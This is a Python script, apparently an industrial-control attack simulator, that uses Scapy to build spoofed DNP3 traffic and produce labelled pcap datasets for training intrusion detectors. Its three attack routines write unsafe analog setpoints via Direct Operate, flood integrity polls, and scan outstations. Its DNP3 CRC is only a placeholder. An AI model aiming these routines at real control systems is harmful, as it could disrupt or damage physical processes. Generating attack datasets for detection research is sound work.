#!/usr/bin/env python3

import argparse
import logging
import threading
import time
import random
import json
from datetime import datetime, timezone
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional
from collections import defaultdict
import os
import csv
import statistics
import numpy as np
import sys
import struct

# Try to import scapy
try:
    from scapy.all import IP, TCP, send, wrpcap, Raw, Packet
    from scapy.fields import ByteField, ShortField, IntField, FieldLenField, XByteField
    SCAPY_AVAILABLE = True
except Exception as e:
    print("Scapy is required. Install via 'pip install scapy'")
    sys.exit(1)

# Custom DNP3 Packet Definitions
class DNP3Link(Packet):
    name = "DNP3 Link Layer"
    fields_desc = [
        XByteField("start1", 0x05),
        XByteField("start2", 0x64),
        ByteField("length", 5),
        ByteField("control", 0x44),
        ShortField("dst", 0),
        ShortField("src", 0),
        ShortField("crc", 0)
    ]
    
    def post_build(self, p, pay):
        # Calculate length if not set
        if self.length == 5:
            self.length = len(pay) + 5
            p = p[:2] + struct.pack("B", self.length) + p[3:]
        # Simple CRC (in real implementation, use proper DNP3 CRC)
        # For simulation purposes, we'll use a placeholder
        return p + pay

class DNP3Transport(Packet):
    name = "DNP3 Transport Layer"
    fields_desc = [
        ByteField("control", 0xC0)  # FIR=1, FIN=1, SEQ=0
    ]

class DNP3Application(Packet):
    name = "DNP3 Application Layer"
    fields_desc = [
        ByteField("control", 0xC0),  # FIR=1, FIN=1, CON=0, UNS=0, SEQ=0
        ByteField("func", 1),
    ]

class DNP3ObjectHeader(Packet):
    name = "DNP3 Object Header"
    fields_desc = [
        ByteField("group", 30),
        ByteField("variation", 1),
        ByteField("qualifier", 0x07),  # 16-bit start/stop
        ShortField("start", 0),
        ShortField("stop", 0)
    ]

class DNP3AnalogOutput(Packet):
    name = "DNP3 Analog Output"
    fields_desc = [
        IntField("value", 0),
        ByteField("status", 0x01)
    ]

# Load process_model.json
if os.path.exists('process_model.json'):
    try:
        with open('process_model.json', 'r') as f:
            CONFIG = json.load(f)
    except Exception as e:
        print(f"Error loading process_model.json: {e}")
        CONFIG = {}
else:
    print("process_model.json not found. Using default configurations.")
    CONFIG = {}

SAFE_RANGES = CONFIG.get('safe_ranges', {
    40001: [10, 50],
    40002: [20, 60],
    40003: [5, 30],
    40005: [0, 100]
})
PLC_LOGICALS = CONFIG.get('plc_targets', [
    {"logical_ip": "192.168.1.100", "unit_id": 100},
    {"logical_ip": "192.168.1.101", "unit_id": 101},
    {"logical_ip": "192.168.1.102", "unit_id": 102}
])
LOOPBACK_MAPPING = CONFIG.get('loopback_mapping', {"use_loopback": True, "loopback_ip": "127.0.0.1", "base_port": 20000})
ATTACK_SETTINGS = CONFIG.get('attack_settings', {})

# Defaults from config/code
P1_IRG_MIN = ATTACK_SETTINGS.get('p1', {}).get('irg_min', 5.0)
P1_IRG_MAX = ATTACK_SETTINGS.get('p1', {}).get('irg_max', 20.0)
P1_MITM_MU_MS = ATTACK_SETTINGS.get('p1', {}).get('mitm_mu_ms', 250.0)
P1_MITM_SIGMA_MS = ATTACK_SETTINGS.get('p1', {}).get('mitm_sigma_ms', 100.0)
P2_POISSON_LAMBDA = ATTACK_SETTINGS.get('p2', {}).get('poisson_lambda', 60.0)
P3_SCAN_DELAY = ATTACK_SETTINGS.get('p3', {}).get('scan_delay_s', 0.5)

DNP3_PORT = LOOPBACK_MAPPING.get('base_port', 20000)

ATTACK_IP_RANGES = {
    'P1_APT': range(10, 20),
    'P2_Insider': range(20, 30),
    'P3_Opportunistic': range(30, 40)
}

@dataclass
class AttackEvent:
    timestamp_utc: str
    source_ip: str
    target_ip: str
    transaction_id: int
    attacker_profile_id: str
    attack_category: str
    attack_type_detail: str
    dnp3_fc_used: int
    target_register_address: int
    injected_value: int
    attack_intensity_rps: float
    induced_delay_ms: float

# --- Process/Model Logic ---
class ProcessModel:
    def __init__(self, safe_ranges: Dict):
        # Ensure keys are ints for lookup, values are tuples
        self.safe_ranges = {int(k): tuple(v) for k,v in safe_ranges.items()}
        self.normal_poll_registers = [40001, 40002, 40003]
        self.normal_poll_interval = 2.0

    def get_normal_value(self, register):
        if register in self.safe_ranges:
            low, high = self.safe_ranges[register]
            return random.randint(low, high)
        return random.randint(0, 100)

    def get_malicious_value(self, register):
        if register in self.safe_ranges:
            low, high = self.safe_ranges[register]
            # sometimes extreme high, sometimes below low
            if random.random() < 0.6:
                return random.randint(high + 20, high + 100)
            else:
                return max(0, random.randint(0, max(0, low - 5)))
        return 65535 # Fallback to a clear outlier value

# --- DNP3 Traffic Generator ---
class DNP3TrafficGenerator:
    # DNP3 Function Codes
    FC_CONFIRM = 0
    FC_READ = 1
    FC_WRITE = 2
    FC_SELECT = 3
    FC_OPERATE = 4
    FC_DIRECT_OPERATE = 5
    FC_DIRECT_OPERATE_NR = 6
    FC_FREEZE = 7
    FC_FREEZE_NR = 8
    FC_FREEZE_CLEAR = 9
    FC_FREEZE_CLEAR_NR = 10
    FC_FREEZE_AT_TIME = 11
    FC_FREEZE_AT_TIME_NR = 12
    FC_COLD_RESTART = 13
    FC_WARM_RESTART = 14
    FC_INITIALIZE_DATA = 15
    FC_INITIALIZE_APPLICATION = 16
    FC_START_APPLICATION = 17
    FC_STOP_APPLICATION = 18
    FC_SAVE_CONFIGURATION = 19
    FC_ENABLE_UNSOLICITED = 20
    FC_DISABLE_UNSOLICITED = 21
    FC_ASSIGN_CLASS = 22
    FC_DELAY_MEASURE = 23
    FC_RECORD_CURRENT_TIME = 24
    FC_OPEN_FILE = 25
    FC_CLOSE_FILE = 26
    FC_DELETE_FILE = 27

    MASTER_ADDRESS = 1

    def __init__(self, interface: Optional[str] = None, capture_pcap: bool = True, duration_seconds: int = 90):
        self.interface = interface
        self.capture_pcap = capture_pcap
        self.process_model = ProcessModel(SAFE_RANGES)
        self.transaction_counter = 0
        self.transaction_lock = threading.Lock()
        self.stop_flag = threading.Event()
        self.setup_logging()
        self.attack_events: List[AttackEvent] = []
        self.events_lock = threading.Lock()
        self.stats = defaultdict(int)
        self.stats_lock = threading.Lock()
        self.captured_packets = []
        self.capture_lock = threading.Lock()
        self.packet_labels_data = []
        # Build PLC target mapping
        self.plc_targets = []
        if LOOPBACK_MAPPING.get('use_loopback', True):
            loop_ip = LOOPBACK_MAPPING.get('loopback_ip', '127.0.0.1')
            for p in PLC_LOGICALS:
                self.plc_targets.append({"logical_ip": p["logical_ip"], "ip": loop_ip, "unit_id": p["unit_id"], "port": DNP3_PORT})
        else:
            for p in PLC_LOGICALS:
                self.plc_targets.append({"logical_ip": p["logical_ip"], "ip": p["logical_ip"], "unit_id": p["unit_id"], "port": DNP3_PORT})
        
        self.attack_threads = {
            'P1_APT': self.attack_p1_stealth_fci,
            'P2_Insider': self.attack_p2_query_flooding,
            'P3_Opportunistic': self.attack_p3_device_scanning
        }

    # --- Utility Methods (Logging, Stats, Pcap) ---
    def setup_logging(self):
        log_format = '%(asctime)s.%(msecs)03d - %(threadName)s - %(levelname)s - %(message)s'
        date_format = '%Y-%m-%d %H:%M:%S'

        logging.basicConfig(level=logging.INFO, format=log_format, datefmt=date_format, handlers=[logging.StreamHandler()])
        self.logger = logging.getLogger('dnp3_sim')

    def get_transaction_id(self):
        with self.transaction_lock:
            self.transaction_counter += 1
            return self.transaction_counter & 0xffff  # 16-bit transaction id

    def atomic_log(self, event: AttackEvent):
        # Log JSON atomically
        with self.events_lock:
            self.attack_events.append(event)
            self.logger.info("ATTACK: " + json.dumps(asdict(event), default=str))

    def capture_packet(self, pkt, label: str): # Modified to accept label
        if self.capture_pcap:
            with self.capture_lock:
                # Use a separate counter or ensure transaction_counter is atomic for this
                packet_num = len(self.captured_packets) + 1 # Use current length as packet number
                
                self.captured_packets.append(pkt)
                
                # Store the label data
                self.packet_labels_data.append({
                    'packet_number': packet_num,
                    # Map attack profile ID to the required label format (P1_APT -> P1)
                    'label': label.split('_')[0] if label != 'N' else 'N'
                })

    def send_packet(self, pkt, label: str): # New label argument
        try:
            send(pkt, verbose=0, iface=self.interface)
            self.capture_packet(pkt, label) # Pass the label
        except Exception as e:
            self.logger.error(f"Failed to send packet on interface {self.interface}. Exception: {e}")

    # --- Packet Construction Methods ---
    def make_dnp3_base_packet(self, src_ip, dst_ip, dst_addr, src_addr, dst_port=DNP3_PORT):
        """Build the base DNP3 packet with IP/TCP/Link/Transport layers"""
        base_pkt = (
            IP(src=src_ip, dst=dst_ip) / 
            TCP(sport=random.randint(1024, 65535), dport=dst_port, flags='PA') /
            DNP3Link(dst=dst_addr, src=src_addr, control=0x44) /
            DNP3Transport(control=0xC0)
        )
        return base_pkt

    def make_dnp3_read_analog(self, src_ip, dst_ip, dst_addr, src_addr, index, quantity=1, dst_port=DNP3_PORT):
        """Read Analog Input (Group 30 Var 1)"""
        base_pkt = self.make_dnp3_base_packet(src_ip, dst_ip, dst_addr, src_addr, dst_port)
        app_layer = (
            DNP3Application(control=0xC0, func=self.FC_READ) /
            DNP3ObjectHeader(group=30, variation=1, qualifier=0x07, start=index, stop=index+quantity-1)
        )
        return base_pkt / app_layer

    def make_dnp3_write_analog(self, src_ip, dst_ip, dst_addr, src_addr, index, value, dst_port=DNP3_PORT):
        """Direct Operate Analog Output (Group 40)"""
        base_pkt = self.make_dnp3_base_packet(src_ip, dst_ip, dst_addr, src_addr, dst_port)
        app_layer = (
            DNP3Application(control=0xC0, func=self.FC_DIRECT_OPERATE) /
            DNP3ObjectHeader(group=40, variation=1, qualifier=0x17, start=index, stop=index) /
            DNP3AnalogOutput(value=value, status=0x01)
        )
        return base_pkt / app_layer

    def make_dnp3_integrity_poll(self, src_ip, dst_ip, dst_addr, src_addr, dst_port=DNP3_PORT):
        """Integrity Poll - Read Class 0 (Group 60 Var 1)"""
        base_pkt = self.make_dnp3_base_packet(src_ip, dst_ip, dst_addr, src_addr, dst_port)
        app_layer = (
            DNP3Application(control=0xC0, func=self.FC_READ) /
            DNP3ObjectHeader(group=60, variation=1, qualifier=0x06, start=0, stop=0)
        )
        return base_pkt / app_layer
    
    def make_dnp3_read_iin(self, src_ip, dst_ip, dst_addr, src_addr, dst_port=DNP3_PORT):
        """Read Device Attributes (for scanning/fingerprinting)"""
        base_pkt = self.make_dnp3_base_packet(src_ip, dst_ip, dst_addr, src_addr, dst_port)
        app_layer = (
            DNP3Application(control=0xC0, func=self.FC_READ) /
            DNP3ObjectHeader(group=0, variation=254, qualifier=0x06, start=0, stop=0)
        )
        return base_pkt / app_layer

    # --- Traffic Generators (Normal and Attacks) ---
    def generate_normal_traffic(self, duration_seconds: float):
        self.logger.info("Starting normal DNP3 traffic generation (Integrity Polls)")
        start_time = time.time()
        normal_client_ip = '192.168.10.5'
        while time.time() - start_time < duration_seconds and not self.stop_flag.is_set():
            for t in self.plc_targets:
                dst_addr = t['unit_id'] 
                pkt = self.make_dnp3_integrity_poll(
                    src_ip=normal_client_ip, 
                    dst_ip=t['ip'], 
                    dst_addr=dst_addr, 
                    src_addr=self.MASTER_ADDRESS, 
                    dst_port=t.get('port', DNP3_PORT)
                )
                self.send_packet(pkt, 'N')
                self.update_stats('normal_traffic')
                time.sleep(self.process_model.normal_poll_interval * random.uniform(0.9, 1.1))
        self.logger.info("Normal DNP3 traffic generator finished")

    def attack_p1_stealth_fci(self, duration_seconds: float):
        self.logger.info("P1 (APT): Stealth FCI start (DNP3 Direct Operate Analog Output)")
        profile_id = 'P1_APT'
        start_time = time.time()
        count = 0
        while time.time() - start_time < duration_seconds and not self.stop_flag.is_set():
            ip_range = ATTACK_IP_RANGES.get(profile_id, range(10, 20))
            src_ip = random.choice([f'192.168.10.{i}' for i in ip_range])
            target = random.choice(self.plc_targets)
            critical_register = random.choice([40005, 40001, 40002])
            malicious_value = self.process_model.get_malicious_value(critical_register)
            dnp3_index = critical_register - 40001
            dst_addr = target['unit_id']
            tid = self.get_transaction_id()

            pkt = self.make_dnp3_write_analog(
                src_ip=src_ip, 
                dst_ip=target['ip'], 
                dst_addr=dst_addr, 
                src_addr=self.MASTER_ADDRESS, 
                index=dnp3_index, 
                value=malicious_value, 
                dst_port=target.get('port', DNP3_PORT)
            )
            induced_ms = max(0.0, random.gauss(P1_MITM_MU_MS, P1_MITM_SIGMA_MS))
            self.send_packet(pkt, profile_id)
            count += 1
            event = AttackEvent(
                timestamp_utc=datetime.now(timezone.utc).isoformat(),
                source_ip=src_ip,
                target_ip=target['logical_ip'],
                transaction_id=tid,
                attacker_profile_id=profile_id,
                attack_category='Integrity',
                attack_type_detail='Stealth_FCI_DNP3_DirectOperate',
                dnp3_fc_used=self.FC_DIRECT_OPERATE,
                target_register_address=critical_register,
                injected_value=malicious_value,
                attack_intensity_rps=1.0 / max(1e-6, random.uniform(P1_IRG_MIN, P1_IRG_MAX)),
                induced_delay_ms=round(induced_ms, 3)
            )
            self.atomic_log(event)
            self.update_stats('p1_fci_attacks')
            time.sleep(random.uniform(P1_IRG_MIN, P1_IRG_MAX))
        self.logger.info(f"P1 completed {count} requests")

    def attack_p2_query_flooding(self, duration_seconds: float):
        self.logger.info("P2 (Insider): Integrity Poll flooding start")
        profile_id = 'P2_Insider'
        start_time = time.time()
        count = 0
        lam = P2_POISSON_LAMBDA
        while time.time() - start_time < duration_seconds and not self.stop_flag.is_set():
            n = int(np.random.poisson(lam))
            burst_start = time.time()
            for _ in range(n):
                ip_range = ATTACK_IP_RANGES.get(profile_id, range(20, 30))
                src_ip = random.choice([f'192.168.10.{i}' for i in ip_range])
                target = random.choice(self.plc_targets)
                dst_addr = target['unit_id']

                pkt = self.make_dnp3_integrity_poll(
                    src_ip, 
                    target['ip'], 
                    dst_addr, 
                    self.MASTER_ADDRESS, 
                    dst_port=target.get('port', DNP3_PORT)
                )
                attack_detail = 'Integrity_Poll_Flooding_DNP3_Read'
                fc = self.FC_READ
                injected_val = 0
                register = 0
                    
                self.send_packet(pkt, profile_id)
                count += 1
                
                if count % 10 == 0:
                    event = AttackEvent(
                        timestamp_utc=datetime.now(timezone.utc).isoformat(),
                        source_ip=src_ip,
                        target_ip=target['logical_ip'],
                        transaction_id=self.get_transaction_id(),
                        attacker_profile_id=profile_id,
                        attack_category='Availability', 
                        attack_type_detail=attack_detail,
                        dnp3_fc_used=fc,
                        target_register_address=register,
                        injected_value=injected_val,
                        attack_intensity_rps=lam,
                        induced_delay_ms=0.0
                    )
                    self.atomic_log(event)
                self.update_stats('p2_flooding_attacks')
                time.sleep(0.001)
            
            elapsed = time.time() - burst_start
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)
                
        self.logger.info(f"P2 completed {count} requests")

    def attack_p3_device_scanning(self, duration_seconds: float):
        self.logger.info("P3 (Opportunistic): Outstation scanning start (DNP3 Read Device Attributes)")
        profile_id = 'P3_Opportunistic'
        start_time = time.time()
        count = 0
        while time.time() - start_time < duration_seconds and not self.stop_flag.is_set():
            ip_range = ATTACK_IP_RANGES.get(profile_id, range(30, 40))
            for t in self.plc_targets:
                src_ip_last_octet = random.choice(ip_range)
                src_ip = f'192.168.10.{src_ip_last_octet}'
                dst_addr = t['unit_id']
                tid = self.get_transaction_id()
                
                pkt = self.make_dnp3_read_iin(
                    src_ip=src_ip, 
                    dst_ip=t['ip'], 
                    dst_addr=dst_addr, 
                    src_addr=self.MASTER_ADDRESS, 
                    dst_port=t.get('port', DNP3_PORT)
                )
                
                self.send_packet(pkt, profile_id)
                count += 1
                event = AttackEvent(
                    timestamp_utc=datetime.now(timezone.utc).isoformat(),
                    source_ip=src_ip, 
                    target_ip=t['logical_ip'],
                    transaction_id=tid,
                    attacker_profile_id=profile_id,
                    attack_category='Reconnaissance',
                    attack_type_detail='Device_Fingerprinting_DNP3_Read',
                    dnp3_fc_used=self.FC_READ,
                    target_register_address=0,
                    injected_value=0,
                    attack_intensity_rps=1.0 / P3_SCAN_DELAY,
                    induced_delay_ms=0.0
                )
                self.atomic_log(event)
                self.update_stats('p3_scanning_attacks')
                time.sleep(P3_SCAN_DELAY)
            
            time.sleep(5.0 * random.uniform(0.9, 1.1))

        self.logger.info(f"P3 completed {count} requests")

    # --- Simulation Orchestration ---
    def run_attack_burst(self, total_duration: int, normal_warmup_s: int, attack_duration_s: int, cooldown_s: int):
        if total_duration < (normal_warmup_s + attack_duration_s + cooldown_s):
            self.logger.warning("Total duration is less than the sum of warmup, attack, and cooldown. Adjusting total duration.")
            total_duration = normal_warmup_s + attack_duration_s + cooldown_s + 10

        self.logger.info(f"SIMULATION START: Total={total_duration}s, Warmup={normal_warmup_s}s, Attack={attack_duration_s}s, Cooldown={cooldown_s}s")
        
        normal_thread = threading.Thread(target=self.generate_normal_traffic, args=(total_duration,), name="NormalThread", daemon=True)
        normal_thread.start()
        
        self.logger.info(f"Phase 1: Normal Traffic Warmup for {normal_warmup_s} seconds.")
        time.sleep(normal_warmup_s)
        
        self.logger.info(f"Phase 2: Attack Burst for {attack_duration_s} seconds.")
        
        all_attacks = list(self.attack_threads.keys())
        num_attacks_to_run = random.randint(1, len(all_attacks))
        active_attacks = random.sample(all_attacks, num_attacks_to_run)
        
        self.logger.info(f"Starting the following attack profiles: {', '.join(active_attacks)}")
        
        attack_threads = []
        for profile_id in active_attacks:
            target_func = self.attack_threads[profile_id]
            thread = threading.Thread(target=target_func, args=(attack_duration_s,), name=f"{profile_id}Thread", daemon=True)
            attack_threads.append(thread)
            thread.start()

        for thread in attack_threads:
            thread.join()
            
        self.logger.info("Phase 2: Attack Burst complete.")
        
        self.logger.info(f"Phase 3: Normal Traffic Cooldown for {cooldown_s} seconds.")
        time.sleep(cooldown_s)
        
        self.stop_flag.set()
        normal_thread.join(timeout=5.0)
        
        self.logger.info("SIMULATION EXECUTION COMPLETE. Generating report...")
        
        report_fn = self.generate_report()
        return report_fn

    # --- Report Generation ---
    def update_stats(self, category, count=1):
        with self.stats_lock:
            self.stats[category] += count

    # In DNP3TrafficGenerator
    def generate_report(self):
        timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        pcap_fn = f"attack_traffic_{timestamp_str}.pcap"
        label_json_fn = f"pcap_labels_{timestamp_str}.json"
        
        # --- 2. Generate JSON Label File for IDS ---
        if self.packet_labels_data:
            label_data = {
                # Use the single, defined PCAP filename as the key
                pcap_fn: { 
                    'packet_labels': self.packet_labels_data
                }
            }
            
            # Save the JSON label file
            with open(label_json_fn, 'w') as f:
                json.dump(label_data, f, indent=2)
                
            self.logger.info(f"JSON Label file saved: {label_json_fn}")

        # --- 3. Save PCAP File ---
        if self.capture_pcap and self.captured_packets:
            try:
                # WRPCAP MUST use the pcap_fn defined at the start
                wrpcap(pcap_fn, self.captured_packets)
                self.logger.info(f"PCAP saved: {pcap_fn} ({len(self.captured_packets)} packets)")
            except Exception as e:
                self.logger.error(f"Failed to save PCAP: {e}")
                
        # The main function expects a report filename, so return the label file name instead.
        return label_json_fn
    
    # --- Analysis Methods ---
    def _analyze_by_profile(self):
        breakdown = defaultdict(int)
        for e in self.attack_events:
            breakdown[e.attacker_profile_id] += 1
        return dict(breakdown)

    def _analyze_by_category(self):
        breakdown = defaultdict(int)
        for e in self.attack_events:
            breakdown[e.attack_category] += 1
        return dict(breakdown)

    def _verify_ip_attribution(self):
        violations = []
        for e in self.attack_events:
            profile = e.attacker_profile_id.split('_')[0]
            pool_range = ATTACK_IP_RANGES.get(e.attacker_profile_id, range(0))
            try:
                last_octet = int(e.source_ip.split('.')[-1])
                if last_octet not in pool_range:
                    violations.append({'profile': profile, 'ip': e.source_ip, 'transaction_id': e.transaction_id, 'timestamp': e.timestamp_utc})
            except Exception:
                violations.append({'profile': profile, 'ip': e.source_ip})
        total = len(self.attack_events)
        return {
            'total_checked': total,
            'violations_found': len(violations),
            'violations': violations,
            'compliance_rate': (total - len(violations))/total*100 if total else 0
        }

    def _analyze_fc_usage(self):
        fc_counts = defaultdict(int)
        fc_by_profile = defaultdict(lambda: defaultdict(int))
        for e in self.attack_events:
            fc_name = f"FC_{e.dnp3_fc_used}"
            fc_counts[fc_name] += 1
            fc_by_profile[e.attacker_profile_id][fc_name] += 1
        return {'total_fc_usage': dict(fc_counts), 'fc_by_profile': {k: dict(v) for k,v in fc_by_profile.items()}}

    def _analyze_temporal_patterns(self):
        if not self.attack_events:
            return {}
        timestamps = [datetime.fromisoformat(e.timestamp_utc) for e in self.attack_events]
        timestamps.sort()
        if len(timestamps) < 2:
            return {}
        intervals = [(timestamps[i+1] - timestamps[i]).total_seconds() for i in range(len(timestamps)-1)]

        return {
            'first_attack': timestamps[0].isoformat(),
            'last_attack': timestamps[-1].isoformat(),
            'total_duration_seconds': (timestamps[-1] - timestamps[0]).total_seconds(),
            'overall_statistics': {
                'mean_interval_seconds': statistics.mean(intervals),
                'std_interval_seconds': statistics.pstdev(intervals) if len(intervals) > 1 else 0,
                'min_interval_seconds': min(intervals),
                'max_interval_seconds': max(intervals),
                'median_interval_seconds': statistics.median(intervals)
            }
        }

    def _run_validation_checks(self):
        results = {}
        ip_check = self._verify_ip_attribution()
        results['attribution_contract'] = ip_check['violations_found'] == 0
        integrity_attacks = [e for e in self.attack_events if e.attack_category == 'Integrity']
        if integrity_attacks:
            violations = 0
            for ev in integrity_attacks:
                reg = ev.target_register_address
                val = ev.injected_value
                if reg in self.process_model.safe_ranges:
                    low, high = self.process_model.safe_ranges[reg]
                    if val < low or val > high:
                        violations += 1
            results['process_violation'] = violations > 0
            results['process_violation_rate'] = violations / len(integrity_attacks)
        else:
            results['process_violation'] = False
            results['process_violation_rate'] = 0.0
        results['concurrency_integrity'] = True
        return results

# ----------------- MAIN -----------------
def main():
    parser = argparse.ArgumentParser(description="ICS DNP3 Attack Simulator for ML Training")
    parser.add_argument('--interface', default='lo', help='Network interface to send packets on (default: lo)')
    parser.add_argument('--duration', type=int, default=180, help='Total simulation duration in seconds')
    parser.add_argument('--warmup', type=int, default=30, help='Duration of initial Normal Traffic in seconds')
    parser.add_argument('--attack-duration', type=int, default=120, help='Duration for which attacks run in seconds')
    parser.add_argument('--cooldown', type=int, default=30, help='Duration of final Normal Traffic in seconds')
    args = parser.parse_args()

    if args.duration < (args.warmup + args.attack_duration + args.cooldown):
        print("Warning: Total duration adjusted to sum of phases.")
        args.duration = args.warmup + args.attack_duration + args.cooldown
    
    gen = DNP3TrafficGenerator(interface=args.interface, capture_pcap=True, duration_seconds=args.duration)
    
    report = gen.run_attack_burst(
        total_duration=args.duration, 
        normal_warmup_s=args.warmup, 
        attack_duration_s=args.attack_duration, 
        cooldown_s=args.cooldown
    )
    print(f"\nSIMULATION SUCCESS. Report: {report}")

if __name__ == '__main__':
    main()